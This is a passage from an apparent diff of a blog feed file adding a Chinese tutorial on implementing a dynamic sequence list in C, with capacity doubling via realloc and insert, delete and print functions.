+<p>这里的主要逻辑是，由于我不清楚我到底要申请多大的空间。所以按照两倍的大小来申请新的空间。也就是下面代码三目操作符里实现的。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SLCheckCapacity</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//插入数据之前先看空间够不够</span></span><br><span class="line">	<span class="keyword">if</span> (ps-&gt;capacity == ps-&gt;size)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//申请空间</span></span><br><span class="line">		<span class="type">int</span> NewCapacity = ps-&gt;capacity == <span class="number">0</span> ? <span class="number">4</span> : <span class="number">2</span> * ps-&gt;capacity;<span class="comment">//三目操作符。</span></span><br><span class="line">		SLDataType* tmp = (SLDataType*)<span class="built_in">realloc</span>(ps-&gt;arr, NewCapacity * <span class="keyword">sizeof</span>(SLDataType));</span><br><span class="line">		<span class="keyword">if</span> (tmp == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">&quot;realloc fail!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//空间申请成功</span></span><br><span class="line">		ps-&gt;arr = tmp;</span><br><span class="line">		ps-&gt;capacity = NewCapacity;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后是实现增删的操作，就不过多赘述了</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//尾插</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPushBack</span><span class="params">(SL* ps, SLDataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//if (ps == NULL)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	return;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	assert(ps);<span class="comment">//等价于assert(ps != NULL)</span></span><br><span class="line">	<span class="comment">//ps-&gt;arr[ps-&gt;size] = x;</span></span><br><span class="line">	<span class="comment">//++ps-&gt;size;</span></span><br><span class="line">	SLCheckCapacity(ps);</span><br><span class="line">	ps-&gt;arr[ps-&gt;size++] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//头插</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPushFront</span><span class="params">(SL* ps, SLDataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">	SLCheckCapacity(ps);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = ps-&gt;size; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		ps-&gt;arr[i] = ps-&gt;arr[i - <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	ps-&gt;arr[<span class="number">0</span>] = x;</span><br><span class="line">	ps-&gt;size++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPrint</span><span class="params">(SL s)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,s.arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//尾删</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPopBack</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(ps);</span><br><span class="line">	assert(ps-&gt;size);</span><br><span class="line">	--ps-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//头删</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SLPopFront</span><span class="params">(SL* ps)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(ps);</span><br><span class="line">	assert(ps-&gt;size);</span><br><span class="line">	<span class="comment">//数据整体往前挪动一位</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ps-&gt;size - <span class="number">1</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ps-&gt;arr[i] = ps-&gt;arr[i + <span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	ps-&gt;size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>持续更新中……</p>
+]]></content>
+      <categories>
+        <category>数据结构</category>
       </categories>
       <tags>
         <tag>C语言</tag>
